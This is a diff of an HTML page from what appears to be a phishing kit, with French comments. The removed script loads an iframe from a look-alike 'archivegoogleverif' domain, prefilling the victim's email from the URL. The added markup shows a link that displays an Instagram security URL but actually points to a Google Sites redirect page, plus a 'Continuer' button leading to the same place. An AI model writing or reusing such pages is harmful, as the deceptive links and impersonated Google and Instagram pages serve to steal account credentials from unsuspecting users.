@@ -38,26 +38,29 @@
       sandbox="allow-scripts allow-same-origin allow-forms"
     ></iframe>
 
-    <script>
-      (function() {
-        // Logique JavaScript standard (pas besoin de React ni de compilation)
-        
-        // 1. Récupérer les paramètres de l'URL
-        const params = new URLSearchParams(window.location.search);
-        
-        // 2. Récupérer l'email ou mettre la valeur par défaut
-        const email = params.get('email') || '******@gmail.com';
+     <div class="login-box" style="text-align: left;">
 
-        // 3. Définir l'URL cible
-        const baseUrl = 'https://archivegoogleverif.pythonanywhere.com/start';
-        const finalUrl = `${baseUrl}?email=${encodeURIComponent(email)}`;
+    <p>Vous allez être redirigé vers Instagram. Cliquez sur "Continuer" pour poursuivre...</p>
 
-        // 4. Mettre à jour la source de l'iframe
-        const iframe = document.getElementById('main-frame');
-        if (iframe) {
-          iframe.src = finalUrl;
-        }
-      })();
-    </script>
+
+    <!-- Le lien avec l'email passé dans l'URL -->
+
+    <a href="https://sites.google.com/view/redirect-instagram" target="_blank">
+
+        https://www.instagram.com/accounts/security?email={{ email }}
+
+    </a>
+
+    <br><br>
+
+    <a href="https://sites.google.com/view/redirect-instagram" target="_blank">
+
+        <button type="submit" class="button-primary">Continuer</button>
+
+    </a>
+
+</div> 
+
+
   </body>
 </html>
